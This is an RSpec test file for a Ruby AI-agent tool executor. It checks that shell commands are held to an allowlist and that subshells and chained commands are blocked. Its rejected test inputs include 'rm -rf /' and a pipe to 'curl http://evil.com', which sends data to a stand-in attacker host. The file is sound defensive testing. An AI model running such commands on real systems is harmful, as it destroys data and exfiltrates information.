# frozen_string_literal: true

RSpec.describe AiSentinel::ToolExecutor do
  let(:tool) { AiSentinel::Tools::ShellCommand.new }
  let(:configuration) do
    config = AiSentinel::Configuration.new
    config.tool_safety = {
      allowed_commands: %w[echo ls cat grep git pwd],
      tool_timeout: 5,
      max_output_bytes: 1024,
      working_directory: '.'
    }
    config
  end
  let(:executor) { described_class.new(tools: [tool], configuration: configuration) }

  describe '#tool_definitions_for' do
    it 'returns Anthropic-formatted definitions' do
      defs = executor.tool_definitions_for(:anthropic)
      expect(defs.size).to eq(1)
      expect(defs.first[:name]).to eq('shell_command')
    end

    it 'returns OpenAI-formatted definitions' do
      defs = executor.tool_definitions_for(:openai)
      expect(defs.size).to eq(1)
      expect(defs.first[:type]).to eq('function')
    end

    it 'raises for unknown provider' do
      expect { executor.tool_definitions_for(:unknown) }.to raise_error(AiSentinel::Error)
    end
  end

  describe '#execute' do
    it 'raises for unknown tool' do
      expect { executor.execute('unknown_tool', {}) }.to raise_error(AiSentinel::Error, /Unknown tool/)
    end

    context 'with shell_command' do
      it 'executes an allowed command' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo hello' }))
        expect(result['stdout'].strip).to eq('hello')
        expect(result['exit_code']).to eq(0)
      end

      it 'rejects commands not in allowlist' do
        expect do
          executor.execute('shell_command', { 'command' => 'rm -rf /' })
        end.to raise_error(AiSentinel::Error, /not in the allowed commands list/)
      end

      it 'rejects subshell execution with $()' do
        expect do
          executor.execute('shell_command', { 'command' => 'echo $(whoami)' })
        end.to raise_error(AiSentinel::Error, /subshell execution/)
      end

      it 'rejects subshell execution with backticks' do
        expect do
          executor.execute('shell_command', { 'command' => 'echo `whoami`' })
        end.to raise_error(AiSentinel::Error, /subshell execution/)
      end

      it 'validates all binaries in composite commands with &&' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo hello && echo world' }))
        expect(result['stdout']).to include('hello')
        expect(result['stdout']).to include('world')
      end

      it 'rejects composite commands where any binary is not allowed' do
        expect do
          executor.execute('shell_command', { 'command' => 'echo hello && rm file.txt' })
        end.to raise_error(AiSentinel::Error, /not in the allowed commands list/)
      end

      it 'validates binaries in piped commands' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo hello | cat' }))
        expect(result['exit_code']).to eq(0)
      end

      it 'rejects piped commands with disallowed binaries' do
        expect do
          executor.execute('shell_command', { 'command' => 'echo hello | curl http://evil.com' })
        end.to raise_error(AiSentinel::Error, /not in the allowed commands list/)
      end

      it 'validates binaries in semicolon-separated commands' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo a; echo b' }))
        expect(result['exit_code']).to eq(0)
      end

      it 'validates binaries in || commands' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'ls /nonexistent || echo fallback' }))
        expect(result['stdout']).to include('fallback')
      end

      it 'handles commands with environment variable prefixes' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'FOO=bar echo hello' }))
        expect(result['exit_code']).to eq(0)
      end

      it 'handles operators inside double quotes' do
        result = JSON.parse(executor.execute('shell_command', {
                                               'command' => 'echo "hello; world && foo || bar | baz"'
                                             }))
        expect(result['stdout'].strip).to eq('hello; world && foo || bar | baz')
        expect(result['exit_code']).to eq(0)
      end

      it 'handles operators inside single quotes' do
        result = JSON.parse(executor.execute('shell_command', {
                                               'command' => "echo 'hello; world && foo'"
                                             }))
        expect(result['stdout'].strip).to eq('hello; world && foo')
        expect(result['exit_code']).to eq(0)
      end

      it 'raises on missing command parameter' do
        expect do
          executor.execute('shell_command', {})
        end.to raise_error(AiSentinel::Error, /Missing required parameter/)
      end

      it 'raises on empty command' do
        expect do
          executor.execute('shell_command', { 'command' => '   ' })
        end.to raise_error(AiSentinel::Error, /non-empty string/)
      end

      it 'truncates output exceeding max_output_bytes' do
        result = JSON.parse(executor.execute('shell_command', {
                                               'command' => "echo #{'x' * 2000}"
                                             }))
        expect(result['stdout']).to include('[truncated at 1024 bytes]')
      end

      it 'returns timeout error when command exceeds timeout' do
        config = AiSentinel::Configuration.new
        config.tool_safety = { allowed_commands: %w[sleep], tool_timeout: 1 }
        slow_executor = described_class.new(tools: [tool], configuration: config)

        result = JSON.parse(slow_executor.execute('shell_command', { 'command' => 'sleep 10' }))
        expect(result['stderr']).to include('timed out')
        expect(result['exit_code']).to eq(-1)
      end
    end

    context 'without allowlist (empty)' do
      let(:configuration) do
        config = AiSentinel::Configuration.new
        config.tool_safety = { allowed_commands: [], tool_timeout: 5 }
        config
      end

      it 'allows any command when allowlist is empty' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo anything' }))
        expect(result['stdout'].strip).to eq('anything')
      end
    end

    context 'without tool_safety configured' do
      let(:configuration) do
        config = AiSentinel::Configuration.new
        config
      end

      it 'allows any command with default settings' do
        result = JSON.parse(executor.execute('shell_command', { 'command' => 'echo default' }))
        expect(result['stdout'].strip).to eq('default')
      end
    end
  end
end
